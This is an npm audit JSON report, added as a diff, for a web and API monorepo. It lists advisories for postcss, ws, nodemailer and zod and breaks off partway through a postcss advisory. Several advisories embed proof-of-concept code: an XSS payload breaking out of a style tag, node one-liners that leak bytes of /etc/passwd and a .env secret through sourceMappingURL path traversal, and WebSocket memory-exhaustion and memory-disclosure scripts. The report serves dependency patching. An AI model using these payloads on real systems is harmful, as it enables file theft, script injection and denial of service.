@@ -1,0 +1,731 @@
+{
+  "actions": [
+    {
+      "action": "review",
+      "module": "postcss",
+      "resolves": [
+        {
+          "id": 1117015,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1124252,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1130709,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1139510,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "ws",
+      "resolves": [
+        {
+          "id": 1119108,
+          "path": "apps__api>@p2pdotme/sdk>viem>ws",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1123259,
+          "path": "apps__api>@p2pdotme/sdk>viem>ws",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "nodemailer",
+      "resolves": [
+        {
+          "id": 1240113,
+          "path": "apps__api>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242826,
+          "path": "apps__api>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243091,
+          "path": "apps__api>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243092,
+          "path": "apps__api>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243093,
+          "path": "apps__api>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243442,
+          "path": "apps__api>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243443,
+          "path": "apps__api>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243444,
+          "path": "apps__api>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "zod",
+      "resolves": [
+        {
+          "id": 1243066,
+          "path": "apps__api>@p2pdotme/sdk>zod",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1117015": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps__web>next>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-qx2v-qp2m-jg93\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41305\n- https://github.com/postcss/postcss/releases/tag/8.5.10\n- https://github.com/advisories/GHSA-qx2v-qp2m-jg93",
+      "created": "2026-04-24T15:31:42.000Z",
+      "id": 1117015,
+      "npm_advisory_id": null,
+      "overview": "# PostCSS: XSS via Unescaped `</style>` in CSS Stringify Output\n\n## Summary\n\nPostCSS v8.5.5 (latest) does not escape `</style>` sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML `<style>` tags, `</style>` in CSS values breaks out of the style context, enabling XSS.\n\n## Proof of Concept\n\n```javascript\nconst postcss = require('postcss');\n\n// Parse user CSS and re-stringify for page embedding\nconst userCSS = 'body { content: \"</style><script>alert(1)</script><style>\"; }';\nconst ast = postcss.parse(userCSS);\nconst output = ast.toResult().css;\nconst html = `<style>${output}</style>`;\n\nconsole.log(html);\n// <style>body { content: \"</style><script>alert(1)</script><style>\"; }</style>\n//\n// Browser: </style> closes the style tag, <script> executes\n```\n\n**Tested output** (Node.js v22, postcss v8.5.5):\n```\nInput: body { content: \"</style><script>alert(1)</script><style>\"; }\nOutput: body { content: \"</style><script>alert(1)</script><style>\"; }\nContains </style>: true\n```\n\n## Impact\n\nImpact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.\n\n## Suggested Fix\n\nEscape `</style` in all stringified output values:\n```javascript\noutput = output.replace(/<\\/(style)/gi, '<\\\\/$1');\n```\n\n## Credits\nDiscovered and reported by [Sunil Kumar](https://tharvid.in) ([@TharVid](https://github.com/TharVid))",
+      "reported_by": null,
+      "title": "PostCSS has XSS via Unescaped </style> in its CSS Stringify Output",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41305"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<8.5.10",
+      "github_advisory_id": "GHSA-qx2v-qp2m-jg93",
+      "recommendation": "Upgrade to version 8.5.10 or later",
+      "patched_versions": ">=8.5.10",
+      "updated": "2026-04-24T15:31:44.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-qx2v-qp2m-jg93"
+    },
+    "1119108": {
+      "findings": [
+        {
+          "version": "8.18.3",
+          "paths": [
+            "apps__api>@p2pdotme/sdk>viem>ws"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/websockets/ws/security/advisories/GHSA-58qx-3vcg-4xpx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-45736\n- https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086\n- https://github.com/advisories/GHSA-58qx-3vcg-4xpx",
+      "created": "2026-05-18T19:02:40.000Z",
+      "id": 1119108,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe `websocket.close()` implementation is vulnerable to uninitialized memory disclosure when a `TypedArray` is passed as the reason argument.\n\n### Proof of concept\n\n```js\nimport { deepStrictEqual } from 'node:assert';\nimport { WebSocket, WebSocketServer } from 'ws';\n\nconst wss = new WebSocketServer(\n  { port: 0, skipUTF8Validation: true },\n  function () {\n    const { port } = wss.address();\n    const ws = new WebSocket(`ws://localhost:${port}`, {\n      skipUTF8Validation: true\n    });\n\n    ws.on('close', function (code, reason) {\n      deepStrictEqual(reason, Buffer.alloc(80));\n    });\n  }\n);\n\nwss.on('connection', function (ws) {\n  ws.close(1000, new Float32Array(20));\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.20.1 (https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086).\n\n### Credits\n\nCredit for the private and responsible disclosure of this issue goes to [Nikita Skovoroda](https://github.com/ChALkeR).\n\n### Remarks\n\nAlthough the calculated CVSS severity is medium, the actual severity is believed to be low, as the flaw is only exploitable through misuse that is unlikely in practice.\n\n### Resources\n\n- https://github.com/advisories/GHSA-58qx-3vcg-4xpx\n- https://www.cve.org/CVERecord?id=CVE-2026-45736",
+      "reported_by": null,
+      "title": "ws: Uninitialized memory disclosure",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-45736"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ws",
+      "vulnerable_versions": ">=8.0.0 <8.20.1",
+      "github_advisory_id": "GHSA-58qx-3vcg-4xpx",
+      "recommendation": "Upgrade to version 8.20.1 or later",
+      "patched_versions": ">=8.20.1",
+      "updated": "2026-05-18T19:02:42.000Z",
+      "cvss": {
+        "score": 4.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-908"
+      ],
+      "url": "https://github.com/advisories/GHSA-58qx-3vcg-4xpx"
+    },
+    "1123259": {
+      "findings": [
+        {
+          "version": "8.18.3",
+          "paths": [
+            "apps__api>@p2pdotme/sdk>viem>ws"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/websockets/ws/security/advisories/GHSA-96hv-2xvq-fx4p\n- https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7\n- https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53\n- https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94\n- https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8\n- https://nvd.nist.gov/vuln/detail/CVE-2026-48779\n- https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-48779.json\n- https://bugzilla.redhat.com/show_bug.cgi?id=2489661\n- https://access.redhat.com/security/cve/CVE-2026-48779\n- https://access.redhat.com/errata/RHSA-2026:34342\n- https://access.redhat.com/errata/RHSA-2026:33574\n- https://access.redhat.com/errata/RHSA-2026:33183\n- https://access.redhat.com/errata/RHSA-2026:33173\n- https://access.redhat.com/errata/RHSA-2026:33163\n- https://access.redhat.com/errata/RHSA-2026:33160\n- https://access.redhat.com/errata/RHSA-2026:33155\n- https://access.redhat.com/errata/RHSA-2026:29197\n- https://access.redhat.com/errata/RHSA-2026:36820\n- https://access.redhat.com/errata/RHSA-2026:36754\n- https://access.redhat.com/errata/RHSA-2026:37272\n- https://access.redhat.com/errata/RHSA-2026:27171\n- https://access.redhat.com/errata/RHSA-2026:26638\n- https://github.com/advisories/GHSA-96hv-2xvq-fx4p",
+      "created": "2026-06-15T16:34:23.000Z",
+      "id": 1123259,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA high volume of exceptionally small fragments and data chunks can be sent by a peer, with modest network traffic, to force the remote peer into allocating and holding structural wrappers that consume far more memory than the default documented message-size limit, leading to process termination due to OOM.\n\n### Proof of concept\n\n```js\nimport { WebSocket, WebSocketServer } from 'ws';\n\nconst wss = new WebSocketServer({ port: 0 }, function () {\n  const data = Buffer.alloc(1);\n  const options = { fin: false };\n  const { port } = wss.address();\n  const ws = new WebSocket(`ws://localhost:${port}`);\n\n  ws.on('open', function () {\n    (function send() {\n      ws.send(data, options, function (err) {\n        if (err) return;\n        send();\n      });\n    })();\n  });\n\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`client close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n\nwss.on('connection', function (ws) {\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`server close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.21.0 (https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94) and backported to ws@7.5.11 (https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8), ws@6.2.4 (https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7), and ws@5.2.5 (https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53).\n\n### Workarounds\n\nIn vulnerable versions, the issue can be mitigated by lowering the value of the `maxPayload` option if possible.\n\n### Credits\n\nThe vulnerability was responsibly disclosed and fixed by [Nadav Magier](https://github.com/Nadav0077).",
+      "reported_by": null,
+      "title": "ws: Memory exhaustion DoS from tiny fragments and data chunks",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-48779"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "ws",
+      "vulnerable_versions": ">=8.0.0 <8.21.0",
+      "github_advisory_id": "GHSA-96hv-2xvq-fx4p",
+      "recommendation": "Upgrade to version 8.21.0 or later",
+      "patched_versions": ">=8.21.0",
+      "updated": "2026-07-13T15:31:39.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-770",
+        "CWE-1050"
+      ],
+      "url": "https://github.com/advisories/GHSA-96hv-2xvq-fx4p"
+    },
+    "1124252": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps__web>next>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-6g55-p6wh-862q\n- https://github.com/postcss/postcss/commit/aaec7b78b3ce2792585b4b300ef1bd5dd5b3e8ad\n- https://github.com/postcss/postcss/commit/c64b7488d2731dfa16213739b42c34faf5a9eba3\n- https://github.com/postcss/postcss/releases/tag/8.5.12\n- https://github.com/advisories/GHSA-6g55-p6wh-862q",
+      "created": "2026-07-23T15:06:16.000Z",
+      "id": 1124252,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nPostCSS's `PreviousMap` parses the `/*# sourceMappingURL=PATH */` comment from any CSS string passed to `process()` and dereferences `PATH` against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting `JSON.parse` `SyntaxError` message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no `from`, no `map`, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.).\n\n## Details\n\nThe dangerous chain lives in `lib/previous-map.js` and is wired into every `Input` construction at `lib/input.js:70-77`.\n\n`Input` constructor (`lib/input.js:70-77`):\n\n```js\nif (pathAvailable && sourceMapAvailable) {\n  let map = new PreviousMap(this.css, opts)\n  if (map.text) {\n    this.map = map\n    let file = map.consumer().file\n    if (!this.file && file) this.file = this.mapResolve(file)\n  }\n}\n```\n\n`PreviousMap` constructor (`lib/previous-map.js:17-29`):\n\n```js\nconstructor(css, opts) {\n  if (opts.map === false) return\n  this.loadAnnotation(css)\n  this.inline = this.startWith(this.annotation, 'data:')\n\n  let prev = opts.map ? opts.map.prev : undefined\n  let text = this.loadMap(opts.from, prev)\n  ...\n}\n```\n\nNote `opts.map === false` is the only short-circuit. With default options (`opts.map === undefined`), the rest of the constructor — including the filesystem read — executes.\n\n`loadAnnotation` (`lib/previous-map.js:72-84`) extracts the URL **without sanitisation**:\n\n```js\nloadAnnotation(css) {\n  let comments = css.match(/\\/\\*\\s*# sourceMappingURL=/g)\n  if (!comments) return\n  let start = css.lastIndexOf(comments.pop())\n  let end = css.indexOf('*/', start)\n  if (start > -1 && end > -1) {\n    this.annotation = this.getAnnotationURL(css.substring(start, end))\n  }\n}\n```\n\n`getAnnotationURL` (`lib/previous-map.js:59-61`) only strips the `/*# sourceMappingURL=` prefix and trims whitespace — no scheme check, no path normalisation, no allowlist.\n\n`loadMap` (`lib/previous-map.js:124-128`) — when `prev` is absent and the annotation is not an inline `data:` URI:\n\n```js\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)\n  return this.loadFile(map)\n}\n```\n\n* If `opts.from` is unset, `file` is undefined and the raw attacker-supplied path (e.g. `/etc/passwd`) is used directly.\n* If `opts.from` is set, `path.join(dirname(file), attackerPath)` is used. `path.join` does **not** block `..` segments, so `../../../../../etc/passwd` resolves outside the intended directory.\n\n`loadFile` (`lib/previous-map.js:86-92`) is the sink:\n\n```js\nloadFile(path) {\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\n\nThe bytes are stored in `this.text`. `Input` immediately invokes `map.consumer()` (`lib/input.js:74`), which constructs a `SourceMapConsumer` (`lib/previous-map.js:33`). When the file is not valid source-map JSON (the common case), `source-map-js` calls `JSON.parse`, and V8's `SyntaxError` message embeds the first ~10 bytes of the file content:\n\n```\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\nThis error is propagated back to the caller. Any application that surfaces PostCSS errors (logs, HTTP 500 responses, build-tool output, debug pages) discloses those bytes to the attacker.\n\nTrust-boundary analysis:\n* Attacker controls: CSS input passed to `postcss().process(css, opts?)`.\n* Server resources: any file readable by the Node process — typically including app config, environment files, SSH keys, `/etc/passwd`, `/proc/self/environ`, etc.\n* No mitigations: there is no path validation, scheme allowlist, traversal check, or symlink check. The only relevant check (`startWith(annotation, 'data:')`) routes inline URIs to `decodeInline`; everything else hits `loadFile`.\n\nPrimitives obtained:\n* (a) **Arbitrary file read** — bytes loaded into Node memory.\n* (b) **Information disclosure** — first ~10 bytes leaked via `JSON.parse` `SyntaxError` message.\n* (c) **File-existence oracle** — non-existent paths return silently from `loadFile` (`existsSync` is false → returns undefined → no map text → no consumer call → no error). Existent non-JSON paths throw. Existent JSON paths succeed silently. Three distinguishable states.\n* (d) **DoS primitive** — directing the read at `/dev/zero`, very large files, or device files can stall or crash the process.\n\n## PoC\n\nAll commands executed against this repository's HEAD (postcss 8.5.10) on Node v22.12.0.\n\n**Vector 1 — Absolute path, default options (no `from`, no `map`):**\n\n```bash\n$ node -e 'const p=require(\"postcss\"); \\\n  try { p().process(\"a{color:red}\\n/*# sourceMappingURL=/etc/passwd */\"); } \\\n  catch(e){console.log(e.message)}'\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\nThe first 10 bytes of `/etc/passwd` (`root:x:0:0`) are leaked.\n\n**Vector 2 — Relative `..` traversal with `opts.from` set (simulates a build pipeline that pins `from` to the source file):**\n\n```bash\n$ node -e 'const p=require(\"postcss\"); \\\n  p().process(\"a{color:red}\\n/*# sourceMappingURL=../../../../../etc/passwd */\", \\\n              {from:\"/var/www/html/styles/main.css\", map:{inline:false}}) \\\n   .catch(e=>console.log(e.message))'\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\n`path.join('/var/www/html/styles', '../../../../../etc/passwd')` resolves to `/etc/passwd`.\n\n**Vector 3 — File-existence oracle:**\n\n```bash\n# Existing non-JSON file → throws (file confirmed to exist)\n$ node -e 'require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/etc/passwd */\")'\nSyntaxError: Unexpected token 'r', \"root:x:0:0\"... is not valid JSON\n\n# Non-existent file → returns silently (file confirmed absent)\n$ node -e 'r=require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/no/such/file */\"); console.log(\"ok\")'\nok\n```\n\n**Vector 4 — Custom file-content leak:**\n\n```bash\n$ printf 'API_KEY=sk-secret-12345\\n' > /tmp/server-secret.env\n$ node -e 'require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/tmp/server-secret.env */\")' 2>&1 | head -1\nSyntaxError: Unexpected token 'A', \"API_KEY=sk\"... is not valid JSON\n```\n\nThe first 10 bytes of `/tmp/server-secret.env` (`API_KEY=sk`) are leaked — sufficient to confirm a token's presence and, in many cases, recover its prefix.\n\n**Filesystem-call trace** (proves the read happens with no opts at all):\n\n```js\nconst fs = require('fs');\nconst orig = fs.readFileSync;\nfs.readFileSync = function(p){\n  if (typeof p==='string' && p.startsWith('/etc')) console.log('[FILE READ]:', p);\n  return orig.apply(this, arguments);\n};\nrequire('postcss')().process('a{}\\n/*# sourceMappingURL=/etc/hostname */');\n// → [FILE READ]: /etc/hostname\n// → SyntaxError: Unexpected token 'D', \"Debian-tri\"... is not valid JSON\n```\n\n## Impact\n\n* **Arbitrary file read** of any file readable by the Node process from any CSS-processing context that accepts attacker-influenced CSS. PostCSS has hundreds of millions of weekly npm downloads and is the standard CSS processor for build tools (webpack `postcss-loader`, vite, parcel, Next.js, Gatsby, etc.) and for runtime CSS-handling libraries (CSS Modules tools, CSS minifiers, theme processors). Any pipeline that runs untrusted user CSS — CMS theme uploads, user-styled blog posts, browser-extension/userstyle services, multi-tenant build farms, third-party-package build pipelines — is exposed.\n* **Confidentiality leak** of the first ~10 bytes of the targeted file via `JSON.parse` `SyntaxError`. This is enough to recover SSH-key headers, environment-variable prefixes (`API_KEY=sk…`), `/etc/passwd` records, the start of `/proc/self/environ`, and other high-value secrets, and to fingerprint the host (`Debian-tri…` from `/etc/hostname`).\n* **File-existence oracle** with three distinguishable response states (silent success, `JSON.parse` error, no-such-file silence), enabling reconnaissance of the host filesystem layout and confirmation of installed software, user accounts, and configuration files.\n* **DoS** by targeting `/dev/zero`, `/proc/kcore`, very large files, or named pipes — `readFileSync` is a synchronous, unbounded read.\n* **Default-on**: triggered with `postcss().process(css)` and no options. The only configuration that disables the bug is the explicit, undocumented-for-this-purpose `{ map: false }`.\n\n## Recommended Fix\n\nThe root cause is that `loadFile` accepts any path the attacker supplies inside a CSS comment. The annotation is meant for tooling, not for production CSS processing of untrusted input. Two layered fixes:\n\n1. **Refuse traversal/absolute paths in `loadMap`** (defence-in-depth):\n\n   ```js\n   // lib/previous-map.js\n   loadMap(file, prev) {\n     if (prev === false) return false\n     if (prev) { /* unchanged */ }\n     else if (this.inline) {\n       return this.decodeInline(this.annotation)\n     } else if (this.annotation) {\n       let annotation = this.annotation\n       // Reject schemes (other than data:, handled above) and absolute paths.\n       if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(annotation)) return\n       if (require('path').isAbsolute(annotation)) return\n       if (!file) return  // No base path → cannot safely resolve.\n       const base = require('path').resolve(require('path').dirname(file))\n       const resolved = require('path').resolve(base, annotation)\n       // Refuse anything that escapes the base directory.\n       if (resolved !== base && !resolved.startsWith(base + require('path').sep)) {\n         return\n       }\n       return this.loadFile(resolved)\n     }\n   }\n   ```\n\n2. **Require explicit opt-in to follow on-disk source-map annotations**: gate the `loadFile(map)` call in `loadMap` behind an option such as `opts.map.annotation === true` or `opts.map.followAnnotation === true`. Today, the only way to opt out is `{ map: false }`, which also disables in-memory previous-map handling. Inverting the default — only follow disk-resident annotations when explicitly asked — eliminates the entire attack surface for callers that pass untrusted CSS, while preserving build-tool use cases where the annotation is trusted.\n\nA user-facing changelog entry should warn that `postcss().process(untrustedCss)` previously read attacker-controlled paths, and recommend auditing applications that surfaced PostCSS errors to end users.",
+      "reported_by": null,
+      "title": "PostCSS: Arbitrary file read and information disclosure via attacker-controlled sourceMappingURL in CSS comments",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-45623"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.11",
+      "github_advisory_id": "GHSA-6g55-p6wh-862q",
+      "recommendation": "Upgrade to version 8.5.12 or later",
+      "patched_versions": ">=8.5.12",
+      "updated": "2026-07-23T15:06:17.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-6g55-p6wh-862q"
+    },
+    "1130709": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps__web>next>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp\n- https://github.com/postcss/postcss/commit/7beca139e70f9075c6b19700fcb00dd8033e5da8\n- https://github.com/postcss/postcss/releases/tag/8.5.19\n- https://github.com/advisories/GHSA-fxqj-rqcc-2cmp",
+      "created": "2026-08-03T17:11:39.000Z",
+      "id": 1130709,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.\n\n`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.\n\n## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)\n\n```js\n// lib/previous-map.js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (cssFile) {                       // guard runs ONLY when `from` is set\n      let relativePath = relative(dirname(cssFile), path)\n      if (relativePath === '..' ||\n          relativePath.startsWith('..' + sep) ||\n          isAbsolute(relativePath)) {\n        return undefined\n      }\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()   // sink\n  }\n}\n\n// loadMap(): untrusted annotation path, trusted=false; file === opts.from\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)   // no `from` -> map stays the raw URL\n  let unknown = this.loadFile(map, file, false)  // file undefined -> cssFile falsy\n```\n\n## Proof of concept (verified on postcss 8.5.22)\n\n```js\nconst postcss = require('postcss')\nconst fs = require('fs')\n\n// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)\nconst secret = '/tmp/pcpoc/secret_out_of_tree.map'\nfs.writeFileSync(secret, JSON.stringify({\n  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],\n  sourcesContent: ['TOP_SECRET_abcdef']\n}))\n\nconst css = 'a{color:red}\\n/*# sourceMappingURL=' + secret + ' */'\nconst leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')\n\n;(async () => {\n  // A) NO `from`  -> guard skipped -> arbitrary absolute .map read + disclosed\n  const a = await postcss([]).process(css, { map: true })\n  console.log('no from   -> leaked:', !!leaks(a.map))   // true\n\n  // B) WITH `from` -> guard active -> blocked\n  const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })\n  console.log('with from -> leaked:', !!leaks(b.map))    // false\n})()\n```\n\nObserved output on postcss 8.5.22:\n\n```\nno from   -> leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map\nwith from -> leaked: false     # guard rejects the absolute path\n```\n\n`../` traversal (no `from`) also succeeds; non-`.map` targets (`.txt`, `?x=.map`, `#.map`) are blocked by the `.map` check. The tested build contains the GHSA-6g55 fix (`this.json = JSON.parse(...)` in `loadMap`, `consumer()` uses `this.json || this.text`), so this is a residual of that fix.\n\n## Impact\n\nArbitrary `.map`-file read (absolute path or `../` traversal) and disclosure of the target map's `sources` (local filesystem paths) and `sourcesContent` (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a `from` option and exposes `result.map` (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in `.map` that parse as JSON.\n\n## Suggested fix\n\nApply the traversal/absolute-path rejection to the untrusted map path regardless of whether `cssFile` is present (resolve against `process.cwd()` when there is no `cssFile`, and reject absolute paths and `..` escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.",
+      "reported_by": null,
+      "title": "PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-69153"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.22",
+      "github_advisory_id": "GHSA-fxqj-rqcc-2cmp",
+      "recommendation": "Upgrade to version 8.5.23 or later",
+      "patched_versions": ">=8.5.23",
+      "updated": "2026-08-03T17:11:40.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-fxqj-rqcc-2cmp"
+    },
+    "1139510": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps__web>next>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-r28c-9q8g-f849\n- https://github.com/postcss/postcss/commit/95663d3eb7ba26f4854dd19d3b4f4425760cf56c\n- https://github.com/postcss/postcss/releases/tag/8.5.18\n- https://github.com/advisories/GHSA-r28c-9q8g-f849",
+      "created": "2026-07-24T16:24:55.000Z",
+      "id": 1139510,
+      "npm_advisory_id": null,
+      "overview": "## Vulnerability Details\n\n**File**: `lib/previous-map.js`\n**Line**: 87-98 (`loadFile`), 129-144 (`loadMap`)\n\n\n### Root Cause\nPostCSS auto-detects a `/*# sourceMappingURL=... */` comment inside the CSS text it is asked to parse and, unless the caller explicitly passes `map: false`, attempts to load that path from disk as a \"previous source map.\" This happens on every `postcss.parse()` / `postcss().process()` call by default (opt-out, not opt-in).\n\n`loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)`, where `annotation` is the raw, attacker-controlled string from the CSS comment. `path.join()` normalizes but does not sandbox `..` segments, so a `../../../` prefix walks the resolved path outside the intended directory. If `opts.from` is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.\n\n8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in `.map` (`loadFile()`). That fix did not address the traversal itself, only the target extension. Since the `join(dirname(file), map)` logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in `.map` remains readable through this path in the current release (8.5.16).\n\nOnce loaded, `MapGenerator.isMap()` treats the mere presence of a loaded \"previous map\" as an implicit request to generate `result.map`, even when the caller never set the `map` option. If the loaded map has a `sourcesContent` field (common for maps emitted by bundlers/transpilers), that content is merged into `result.map` and returned to the caller — disclosing the traversed-to file's content to whoever supplied the CSS.\n\n### Attack Scenario\n1. A service accepts user-submitted CSS and runs it through PostCSS to lint/format/transform it, e.g. `postcss().process(userCss, { from: 